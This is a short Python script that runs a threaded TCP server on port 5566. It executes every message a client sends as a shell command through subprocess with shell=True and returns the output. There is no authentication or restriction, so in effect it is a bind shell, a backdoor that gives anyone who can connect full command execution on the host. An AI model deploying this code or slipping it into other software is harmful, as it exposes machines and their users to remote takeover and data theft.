import socket
import threading
import subprocess


IP = socket.gethostbyname(socket.gethostname() )
PORT = 5566
ADDR = (IP,PORT)
SIZE =1024
FORMAT="utf-8"
DISCONNECT_MSG ="!DISCONNECT"
def main():
	print("[+] Server is starting >>>>>>>>>>>>>>>>>>>>>>>")
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	server.bind(ADDR)
	print(f"Server is listening on {IP}:{PORT}")
	server.listen()
	
	def execute_command(command):
	
		try:
			print("command to be fired >>>",command)
			return subprocess.check_output(command,shell=True)
		except:
			command_result = "Invalid Command"
			return command_result
	
	def handle_client(conn,addr):
	
		print(f"[+] New Connection:- {addr} connected")
		
		connected = True
		
		while connected:
			msg = conn.recv(SIZE).decode(FORMAT)
			if msg == DISCONNECT_MSG:
				#connected = False
				conn.send("Connection closed".encode(FORMAT))
				break
			result = execute_command(msg)
				
			print(f"[{addr}] {result}")
			
		
			if isinstance(result,bytes):
			
				conn.send(result)
			
			else:
			
				conn.send(result.encode(FORMAT))
			
			
		conn.close()

				
	while True:
		conn, addr =server.accept()
		#print(conn)
		thread = threading.Thread(target = handle_client, args= (conn,addr))
		thread.start()
		print(f"[+] Active connections {threading.activeCount() -1}")

if __name__ ==  "__main__":
	main()